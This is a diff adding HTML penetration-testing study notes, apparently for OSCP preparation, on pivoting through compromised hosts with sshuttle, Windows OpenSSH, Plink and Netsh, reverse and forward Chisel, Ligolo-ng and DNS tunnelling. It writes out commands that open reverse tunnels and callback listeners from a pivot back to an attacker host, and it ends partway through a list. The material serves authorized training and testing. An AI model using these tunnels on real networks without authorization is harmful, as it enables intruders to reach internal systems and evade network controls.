+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The selected application traffic works through the compatible mode: choose sshuttle.</td></tr><tr><td>Ruled out in this context</td><td>Required local permission or remote support is unavailable: reject this route implementation.</td></tr><tr><td>Inconclusive</td><td>TCP success does not establish unsupported UDP/raw behavior; test the actual requirement.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</p>
+<h3 id="3-prerequisites-7">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Working SSH/Python environment, local routing/firewall privileges and explicitly selected supported traffic/subnets.</p>
+<h3 id="4-discover-and-verify-prerequisites-7">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ssh -v USER@PIVOT
+python3 --version
+</code></pre>
+<h3 id="5-why-it-works-7">5. Why it works</h3>
+<p>sshuttle redirects selected application traffic rather than providing an unrestricted raw-packet VPN. DNS handling and supported transports depend on its selected mode/platform.</p>
+<h3 id="6-execute-and-choose-variants-7">6. Execute and choose variants</h3>
+<pre><code class="language-bash">sudo sshuttle --dns \
+  -r SSH_USER@PIVOT:SSH_PORT \
+  INTERNAL_SUBNET ANOTHER_SUBNET
+</code></pre>
+<p>Through a previously established local forward to the SSH pivot:</p>
+<pre><code class="language-bash">sudo sshuttle --dns \
+  -r SSH_USER@127.0.0.1:LOCAL_SSH_PORT \
+  INTERNAL_SUBNET
+</code></pre>
+<blockquote>
+<p>sshuttle is useful when many TCP clients need transparent access. It requires privileges and firewall/redirection support on the client; the remote side needs a compatible Python execution path. It is not a general layer-2 VPN and does not make arbitrary raw-packet or UDP behavior equivalent to direct routing. Record the selected subnets so existing VPN routes are not accidentally captured.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-7">7. Worked example — hypothetical</h3>
+<p>Observation: repeated proxy configuration is hindering several TCP clients. Test: route the selected subnet with the documented sshuttle settings and confirm a service. Illustrative output: a direct-style TCP application reaches the destination. Interpretation: validate DNS and unsupported transports separately.</p>
+<h3 id="8-verify-the-result-7">8. Verify the result</h3>
+<p>Verify the actual application path and ensure only assigned subnets are selected.</p>
+<h3 id="9-failure-and-fallback-7">9. Failure and fallback</h3>
+<p>Missing local privilege, remote runtime or unsupported traffic can break this option. Use fixed forwards/SOCKS or a compatible routed tunnel.</p>
+<h3 id="10-next-transitions-7">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/pivoting/#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a>; <a href="/oscp/notes/methods/lateral-movement/#move-preflight">Match route, destination service and effective authorization</a>; <a href="/oscp/notes/methods/pivoting/#ssh-dynamic">Provide SOCKS access through SSH dynamic forwarding</a>.</p>
+<p><a id="windows-forward"></a></p>
+<h2 id="forward-from-windows-with-openssh-plink-or-netsh">Forward from Windows with OpenSSH, Plink or Netsh</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#8-windows-forwarding-alternatives">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-8">1. Purpose and result</h3>
+<p>A selected TCP service reachable through the Windows pivot.</p>
+<h3 id="2-recognition-clues-8">2. Recognition clues</h3>
+<p>The pivot is Windows and available networking utilities constrain the route.</p>
+<h4 id="find-the-clue-from-your-starting-access-8">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> From a Windows pivot inspect native/available tunnel utilities, its route to the destination and the rights needed by the selected implementation.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">Get-Command ssh,plink,netsh -ErrorAction SilentlyContinue
+Get-Service iphlpsvc
+Test-NetConnection TARGET -Port PORT
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">ssh: available
+iphlpsvc: Running
+Destination TcpTestSucceeded: True
+Administrative portproxy right: not yet known
+</code></pre>
+<p><strong>Recognize this detail:</strong> Windows has a carrier/destination candidate; Netsh administrative state and user-space SSH requirements differ.</p>
+<p><strong>Still missing before method selection:</strong> Choose the supported tool, verify listener/bind/firewall and correct connection direction; check its exact rights.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The selected implementation carries the application and cleanup state is known: use it.</td></tr><tr><td>Ruled out in this context</td><td>No admin rights for portproxy rules out that Netsh route, not a valid user-space SSH option.</td></tr><tr><td>Inconclusive</td><td>A running IP Helper service alone does not establish permission or a working forward.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</p>
+<h3 id="3-prerequisites-8">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Compatible OpenSSH/Plink authentication or administrative Netsh/IP Helper context; correct listener and destination paths.</p>
+<h3 id="4-discover-and-verify-prerequisites-8">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">Get-Command ssh,plink,netsh -ErrorAction SilentlyContinue
+Get-Service iphlpsvc
+Test-NetConnection TARGET -Port PORT
+</code></pre>
+<h3 id="5-why-it-works-8">5. Why it works</h3>
+<p>OpenSSH/Plink carry SSH tunnels; Netsh portproxy provides a fixed TCP mapping and does not authenticate to the destination. Their rights and service prerequisites differ.</p>
+<h3 id="6-execute-and-choose-variants-8">6. Execute and choose variants</h3>
+<h5 id="81-built-in-openssh-client">8.1 Built-in OpenSSH client</h5>
+<pre><code class="language-cmd">where ssh.exe
+ssh.exe -V
+ssh.exe -N -R 127.0.0.1:1080 KALI_USER@LHOST -p KALI_SSH_PORT -o ExitOnForwardFailure=yes -o ServerAliveInterval=30
+</code></pre>
+<p>The same <code>-L</code>, <code>-D</code>, <code>-R</code>, <code>ProxyJump</code> and <code>ProxyCommand</code> concepts apply to current Windows OpenSSH. Remote dynamic forwarding depends on the client version.</p>
+<h5 id="82-plink">8.2 Plink</h5>
+<p>Remote fixed forward from Windows to Kali:</p>
+<pre><code class="language-cmd">plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^
+  -l KALI_USER -pwfile C:\PATH\kali-password.txt ^
+  -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT ^
+  -P KALI_SSH_PORT LHOST
+</code></pre>
+<p>Local dynamic SOCKS on Windows:</p>
+<pre><code class="language-cmd">plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^
+  -l SSH_USER -pwfile C:\PATH\ssh-password.txt ^
+  -D 127.0.0.1:1080 -P SSH_PORT PIVOT
+</code></pre>
+<blockquote>
+<p>Current Plink supports <code>-L</code>, <code>-R</code> and <code>-D</code>, but not OpenSSH's remote-dynamic shorthand. <code>-batch</code> prevents an unseen prompt from hanging; pair it with a verified <code>-hostkey</code>. <code>-pwfile</code> avoids a literal password in the command line but creates a sensitive file that must be protected and removed. Prefer a key or existing authenticated context where feasible.</p>
+</blockquote>
+<h5 id="83-netsh-portproxy">8.3 Netsh portproxy</h5>
+<p>Elevated Windows shell:</p>
+<pre><code class="language-cmd">netsh interface portproxy add v4tov4 ^
+  listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT ^
+  connectaddress=INTERNAL_HOST connectport=INTERNAL_PORT
+
+netsh interface portproxy show all
+netstat -ano -p tcp | findstr ":LOCAL_PORT"
+</code></pre>
+<p>If the existing firewall policy does not already allow the listener and a change is authorized:</p>
+<pre><code class="language-cmd">netsh advfirewall firewall add rule name="OSCP Pivot LOCAL_PORT" ^
+  dir=in action=allow protocol=TCP localport=LOCAL_PORT
+</code></pre>
+<p>Cleanup:</p>
+<pre><code class="language-cmd">netsh interface portproxy delete v4tov4 ^
+  listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT
+
+netsh advfirewall firewall delete rule name="OSCP Pivot LOCAL_PORT"
+</code></pre>
+<blockquote>
+<p><code>portproxy</code> requires an elevated token, forwards TCP rather than UDP, modifies persistent host configuration and may depend on the IP Helper service. A stored rule or listening socket still does not prove the destination is reachable. Record and remove both the proxy and any firewall rule.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-8">7. Worked example — hypothetical</h3>
+<p>Observation: a Windows pivot can reach an internal service. Test: choose an available method whose privilege and direction conditions hold. Illustrative output: the selected forward carries the application's handshake. Interpretation: test destination authorization independently.</p>
+<h3 id="8-verify-the-result-8">8. Verify the result</h3>
+<p>Verify actual listener, route and application, then remove created portproxy/firewall state as appropriate.</p>
+<h3 id="9-failure-and-fallback-8">9. Failure and fallback</h3>
+<p>Missing admin rights blocks Netsh changes without disproving a user-space SSH route; firewall/bind failures are independent.</p>
+<h3 id="10-next-transitions-8">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/lateral-movement/#move-preflight">Match route, destination service and effective authorization</a>; <a href="/oscp/notes/methods/pivoting/#ssh-local">Forward a selected service through an SSH client-side listener</a>; <a href="/oscp/notes/methods/pivoting/#pivot-callback">Build the callback and delivery routes separately from the attack route</a>.</p>
+<p><a id="chisel-reverse"></a></p>
+<h2 id="use-a-reverse-chisel-socks-or-fixed-tcp-tunnel">Use a reverse Chisel SOCKS or fixed TCP tunnel</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#91-reverse-socks-pivot-initiates-outward">Operational procedure</a> | <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#92-reverse-fixed-tcp-forward">Operational procedure</a> | <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#95-chisel-failure-cues">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-9">1. Purpose and result</h3>
+<p>A server-side SOCKS or fixed-port route into pivot-reachable services.</p>
+<h3 id="2-recognition-clues-9">2. Recognition clues</h3>
+<p>A pivot can make outbound HTTP/WebSocket connections to the tunnel server.</p>
+<h4 id="find-the-clue-from-your-starting-access-9">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Map an outbound pivot-to-server HTTP/WebSocket path and identify whether the assessment side needs a fixed listener or SOCKS access.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">chisel --version
+chisel server --help
+chisel client --help
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Compatible peers: inspect versions
+Direction: pivot client -> assessment server
+Required remote: R: fixed destination or R:socks
+</code></pre>
+<p><strong>Recognize this detail:</strong> The outbound carrier and server-side listener requirement identify a reverse-tunnel topology.</p>
+<p><strong>Still missing before method selection:</strong> Verify server reverse mode, fingerprint, carrier upgrade, listener bind and pivot-to-destination compatibility.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The carrier and intended service handshake succeed: choose the matching reverse remote.</td></tr><tr><td>Ruled out in this context</td><td>The carrier/upgrade is blocked with no permitted route: reject this tunnel path.</td></tr><tr><td>Inconclusive</td><td>A connected carrier without application response leaves listener/exit/client behavior unknown.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</p>
+<h3 id="3-prerequisites-9">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Compatible reviewed client/server, server reverse mode, reachable server port and pivot-to-destination access.</p>
+<h3 id="4-discover-and-verify-prerequisites-9">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">chisel --version
+chisel server --help
+chisel client --help
+</code></pre>
+<h3 id="5-why-it-works-9">5. Why it works</h3>
+<p>The Chisel client initiates the carrier connection. A reverse remote specifies a listener on the server; SOCKS and fixed destinations provide different connection selection.</p>
+<h3 id="6-execute-and-choose-variants-9">6. Execute and choose variants</h3>
+<p>On Kali:</p>
+<pre><code class="language-bash">chisel server --reverse --port CHISEL_PORT
+</code></pre>
+<p>Record the server fingerprint. On the pivot:</p>
+<pre><code class="language-bash">chisel client --fingerprint 'SERVER_FINGERPRINT' \
+  LHOST:CHISEL_PORT R:127.0.0.1:1080:socks
+</code></pre>
+<p><code>R:socks</code> is the shorter equivalent using the default server-side <code>127.0.0.1:1080</code> listener. Traffic sent to Kali's SOCKS listener exits through the Chisel client/pivot.</p>
+<pre><code class="language-bash"># Kali
+chisel server --reverse --port CHISEL_PORT
+
+# Pivot: expose an internal service on Kali loopback
+chisel client --fingerprint 'SERVER_FINGERPRINT' LHOST:CHISEL_PORT \
+  R:127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT
+</code></pre>
+<pre><code class="language-bash">chisel --version
+chisel server --help
+chisel client --help
+ss -lntp
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Cue</th><th>Interpretation</th></tr></thead><tbody><tr><td>No connection at server</td><td>Pivot egress, address, listener or WebSocket/proxy path</td></tr><tr><td>HTTP reaches server but upgrade fails</td><td>Intermediary may block WebSocket upgrade</td></tr><tr><td><code>exec format error</code></td><td>Wrong OS/architecture</td></tr><tr><td>Missing GLIBC/version symbol</td><td>Build/runtime incompatibility; choose a compatible official build</td></tr><tr><td>Fingerprint mismatch</td><td>Wrong server or changed key; do not bypass verification blindly</td></tr><tr><td>SOCKS listener exists but endpoint fails</td><td>Pivot-to-destination or application/proxy compatibility</td></tr><tr><td>TCP works but UDP fails</td><td>Ordinary <code>socks</code>, old peer, UDP bind/firewall or unsupported client</td></tr></tbody></table>
+<h3 id="7-worked-example--hypothetical-9">7. Worked example — hypothetical</h3>
+<p>Observation: outbound SSH is unavailable but the permitted HTTP path works. Test: establish the documented reverse tunnel and verify one application. Illustrative output: the server-side listener reaches the internal service. Interpretation: use the selected proxy/fixed destination and test DNS separately.</p>
+<h3 id="8-verify-the-result-9">8. Verify the result</h3>
+<p>Verify tunnel establishment and end-to-end application behavior; a connected carrier alone is insufficient.</p>
+<h3 id="9-failure-and-fallback-9">9. Failure and fallback</h3>
+<p>WebSocket/proxy filtering, reverse mode, listener collision and destination denial are different failures.</p>
+<h3 id="10-next-transitions-9">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/pivoting/#proxy-clients">Use ProxyChains, native SOCKS clients and SSH jump paths appropriately</a>; <a href="/oscp/notes/methods/lateral-movement/#move-preflight">Match route, destination service and effective authorization</a>; <a href="/oscp/notes/methods/pivoting/#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a>.</p>
+<p><a id="chisel-forward"></a></p>
+<h2 id="use-forward-chisel-socks-and-version-supported-udp-routing">Use forward Chisel SOCKS and version-supported UDP routing</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#93-forward-socks-when-the-client-is-on-the-tool-side">Operational procedure</a> | <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#94-current-udp-aware-mode">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-10">1. Purpose and result</h3>
+<p>A forward proxy route with documented TCP/UDP behavior.</p>
+<h3 id="2-recognition-clues-10">2. Recognition clues</h3>
+<p>The assessment-side client can reach a pivot-side tunnel server.</p>
+<h4 id="find-the-clue-from-your-starting-access-10">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Identify which side can reach a tunnel server, then inspect the exact peer version and whether TCP or SOCKS5 UDP ASSOCIATE is required.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">chisel --version
+chisel client --help
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Tool-side client -> pivot server: possible
+Needed transport: TCP, or explicitly supported UDP-aware mode
+Ordinary ProxyChains: TCP-only
+</code></pre>
+<p><strong>Recognize this detail:</strong> Forward placement and actual client transport determine the mode; a UDP-capable tunnel binary does not make every wrapper UDP-capable.</p>
+<p><strong>Still missing before method selection:</strong> Verify compatible peers, server SOCKS setting, listener route and the real application's UDP/TCP support.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The intended application's required transport works end to end: use that configured mode.</td></tr><tr><td>Ruled out in this context</td><td>A TCP-only wrapper is used for a UDP-only operation: reject that combination.</td></tr><tr><td>Inconclusive</td><td>TCP success without UDP-aware client/firewall evidence leaves UDP unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</p>
+<h3 id="3-prerequisites-10">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Compatible client/server roles, reachable carrier, correctly placed SOCKS listener and explicitly supported UDP-aware mode when required.</p>
+<h3 id="4-discover-and-verify-prerequisites-10">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">chisel --version
+chisel client --help
+</code></pre>
+<h3 id="5-why-it-works-10">5. Why it works</h3>
+<p>Forward and reverse Chisel place listeners differently. Ordinary SOCKS clients/ProxyChains do not acquire UDP support merely because a tunnel binary offers a UDP-aware mode.</p>
+<h3 id="6-execute-and-choose-variants-10">6. Execute and choose variants</h3>
+<pre><code class="language-bash"># Pivot/server side
+chisel server --socks5 --port CHISEL_PORT
+
+# Kali/client side
+chisel client --fingerprint 'SERVER_FINGERPRINT' PIVOT:CHISEL_PORT \
+  127.0.0.1:1080:socks
+</code></pre>
+<p>Current upstream Chisel distinguishes:</p>
+<pre><code class="language-text">socks / R:socks       -> SOCKS5 TCP CONNECT only
+udpsocks / R:udpsocks -> TCP CONNECT plus SOCKS5 UDP ASSOCIATE
+</code></pre>
+<pre><code class="language-bash"># Requires compatible current peers
+chisel client --fingerprint 'SERVER_FINGERPRINT' \
+  LHOST:CHISEL_PORT R:127.0.0.1:1080:udpsocks
+</code></pre>
+<blockquote>
+<p>This does not make ProxyChains UDP-capable—ProxyChains remains TCP-only. The UDP application must support SOCKS5 UDP ASSOCIATE, or another compatible adapter must be used. Current Chisel peers, TCP and UDP firewall access to the SOCKS listener, and its documented association/fragmentation limits all matter.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-10">7. Worked example — hypothetical</h3>
+<p>Observation: forward SOCKS works for TCP but a UDP-dependent client fails. Test: inspect Chisel version and that client's UDP/SOCKS support. Illustrative output: the client is TCP-only. Interpretation: select a compatible routed/UDP route instead of assuming the tunnel carries the traffic.</p>
+<h3 id="8-verify-the-result-10">8. Verify the result</h3>
+<p>Verify the actual required transport end to end, with correct listener/exit placement.</p>
+<h3 id="9-failure-and-fallback-10">9. Failure and fallback</h3>
+<p>Version syntax, client compatibility and UDP destination reachability must all hold. Retain the known-working TCP path.</p>
+<h3 id="10-next-transitions-10">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/pivoting/#ligolo-route">Route a selected internal subnet through Ligolo-ng</a>; <a href="/oscp/notes/methods/pivoting/#proxy-clients">Use ProxyChains, native SOCKS clients and SSH jump paths appropriately</a>; <a href="/oscp/notes/methods/pivoting/#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a>.</p>
+<p><a id="ligolo-route"></a></p>
+<h2 id="route-a-selected-internal-subnet-through-ligolo-ng">Route a selected internal subnet through Ligolo-ng</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#10-ligolo-ng-routed-pivot">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-11">1. Purpose and result</h3>
+<p>A verified routed connection path including supported loopback/listener features.</p>
+<h3 id="2-recognition-clues-11">2. Recognition clues</h3>
+<p>Several protocols/subnets require a route-style interface through an agent.</p>
+<h4 id="find-the-clue-from-your-starting-access-11">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Use the pivot's route/interface evidence and the intended application's transport needs to decide whether a routed interface is appropriate.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ip route
+ip link
+./proxy -h
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Existing routes: SELECTED_SUBNET absent
+Required client: unsuitable for current SOCKS path
+Local interface/route permissions: inspect
+</code></pre>
+<p><strong>Recognize this detail:</strong> A selected internal network and proxy-incompatible client suggest a route-style agent, subject to its own transport behavior.</p>
+<p><strong>Still missing before method selection:</strong> Verify compatible proxy/agent, local privileges, carrier, selected route/interface, DNS and any separate reverse listener.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The routed application test works on the selected subnet: choose the agent route.</td></tr><tr><td>Ruled out in this context</td><td>A conflicting/unmodifiable route prevents this design: reject it or select an approved alternate subnet mapping.</td></tr><tr><td>Inconclusive</td><td>Agent connection alone does not prove interface, route or destination reachability.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</p>
+<h3 id="3-prerequisites-11">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Compatible proxy/agent, permitted local interface/route management, reachable carrier and selected assigned subnet.</p>
+<h3 id="4-discover-and-verify-prerequisites-11">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ip route
+ip link
+./proxy -h
+</code></pre>
+<h3 id="5-why-it-works-11">5. Why it works</h3>
+<p>A TUN-style interface lets applications use a route rather than per-tool SOCKS settings. Agent loopback aliases and reverse listeners solve different destination/callback problems and require their documented configuration.</p>
+<h3 id="6-execute-and-choose-variants-11">6. Execute and choose variants</h3>
+<h5 id="101-proxy-and-agent">10.1 Proxy and agent</h5>
+<p>On Kali:</p>
+<pre><code class="language-bash">./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT
+</code></pre>
+<p>In the proxy console, obtain the fingerprint:</p>
+<pre><code class="language-text">certificate_fingerprint
+</code></pre>
+<p>On the pivot:</p>
+<pre><code class="language-bash">./agent -connect LHOST:LIGOLO_PORT -accept-fingerprint CERT_FINGERPRINT
+</code></pre>
+<p><code>-ignore-cert</code> is a controlled-lab/debug fallback, not the baseline.</p>
+<h5 id="102-current-managed-interface-and-route">10.2 Current managed interface and route</h5>
+<p>In the Ligolo console:</p>
+<pre><code class="language-text">interface_create --name ligolo
+session
+ifconfig
+interface_add_route --name ligolo --route INTERNAL_SUBNET
+tunnel_start --tun ligolo
+</code></pre>
+<p>Manual Linux alternative:</p>
+<pre><code class="language-bash">sudo ip tuntap add user "$USER" mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add INTERNAL_SUBNET dev ligolo
+</code></pre>
+<p>Then use normal clients:</p>
+<pre><code class="language-bash">ip route get INTERNAL_HOST
+nmap -sT -Pn -n -p PORTS INTERNAL_HOST
+curl -v http://INTERNAL_HOST:PORT/
+</code></pre>
+<blockquote>
+<p>Ligolo translates connections through a userland network stack. Ordinary TCP clients generally work without ProxyChains, but raw-packet assumptions, ICMP details and some UDP behavior can differ from direct access. Use connect-based validation first.</p>
+</blockquote>
+<h5 id="103-pivot-loopback-services">10.3 Pivot loopback services</h5>
+<p>Ligolo maps its special <code>240.0.0.0/4</code> range to the selected agent's loopback. Add one narrow route:</p>
+<pre><code class="language-bash">sudo ip route add 240.0.0.1/32 dev ligolo
+nmap -sT -Pn -n -p PORTS 240.0.0.1
+</code></pre>
+<p>Use this only when the desired service is bound to <code>127.0.0.1</code> on the agent.</p>
+<h5 id="104-callback-or-file-server-listener-on-the-agent">10.4 Callback or file-server listener on the agent</h5>
+<p>In the selected Ligolo session:</p>
+<pre><code class="language-text">listener_add --addr 0.0.0.0:PIVOT_PORT --to 127.0.0.1:KALI_PORT --tcp
+listener_list
+</code></pre>
+<p>Kali listener:</p>
+<pre><code class="language-bash">ncat -lvn 127.0.0.1 KALI_PORT
+</code></pre>
+<p>An internal target connects to <code>PIVOT_REACHABLE_IP:PIVOT_PORT</code>; Ligolo relays it to Kali's loopback listener. Cleanup:</p>
+<pre><code class="language-text">listener_stop LISTENER_ID
+</code></pre>
+<h3 id="7-worked-example--hypothetical-11">7. Worked example — hypothetical</h3>
+<p>Observation: SOCKS transport limits block the intended client. Test: create the documented selected route and validate one destination service. Illustrative output: the service is reachable through the interface. Interpretation: verify name resolution and any callback listener independently.</p>
+<h3 id="8-verify-the-result-11">8. Verify the result</h3>
+<p>Verify route/interface ownership, destination application and each necessary reverse listener.</p>
+<h3 id="9-failure-and-fallback-11">9. Failure and fallback</h3>
+<p>Overlapping routes, wrong session/interface or absent privilege can create a misleading connected agent without a working path.</p>
+<h3 id="10-next-transitions-11">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/lateral-movement/#move-preflight">Match route, destination service and effective authorization</a>; <a href="/oscp/notes/methods/pivoting/#pivot-dns">Preserve DNS, Kerberos names and time across a pivot</a>; <a href="/oscp/notes/methods/pivoting/#pivot-callback">Build the callback and delivery routes separately from the attack route</a>.</p>
+<p><a id="pivot-dns-tunnel"></a></p>
+<h2 id="conditional-tunnel-through-controlled-dns-infrastructure">Conditional: tunnel through controlled DNS infrastructure</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#14-dns-tunneling-with-dnscat2">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-12">1. Purpose and result</h3>
+<p>A verified constrained DNS carrier and its explicitly configured access capabilities.</p>
+<h3 id="2-recognition-clues-12">2. Recognition clues</h3>
+<p>DNS is an available carrier while simpler permitted routes are unavailable.</p>
+<h4 id="find-the-clue-from-your-starting-access-12">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Use known carrier restrictions and an explicitly approved controlled domain to inspect delegation and DNS reachability.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">dig DOMAIN NS
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Delegated zone: CONTROLLED_DOMAIN
+Authoritative server: CONTROLLED_NS
+Resolver path from pivot: not yet verified
+</code></pre>
+<p><strong>Recognize this detail:</strong> Delegation is an infrastructure prerequisite; an NS record alone does not prove ownership or an operational tunnel.</p>
+<p><strong>Still missing before method selection:</strong> Confirm authorized control, resolver path, compatible client/server/runtime and supported intended operation.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The controlled carrier and required application operation work: use this constrained fallback.</td></tr><tr><td>Ruled out in this context</td><td>No approved domain/control or required DNS path exists: reject this design.</td></tr><tr><td>Inconclusive</td><td>An isolated DNS callback does not establish a stable tunnel or full route.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</p>
+<h3 id="3-prerequisites-12">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Controlled/delegated domain or supported direct setup, reachable DNS path, compatible server/client and allowed execution.</p>
+<h3 id="4-discover-and-verify-prerequisites-12">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">dig DOMAIN NS
+</code></pre>
+<h3 id="5-why-it-works-12">5. Why it works</h3>
+<p>DNS tunneling carries data through query/response infrastructure; resolver behavior, delegation, size and latency matter. A DNS callback does not automatically provide a usable full network route.</p>
+<h3 id="6-execute-and-choose-variants-12">6. Execute and choose variants</h3>
+<p>Use only when ordinary transports are unavailable and DNS is demonstrably permitted. This is a conditional advanced route, but it remains in the current official BOK.</p>
+<p>Prerequisites:</p>
+<ul>
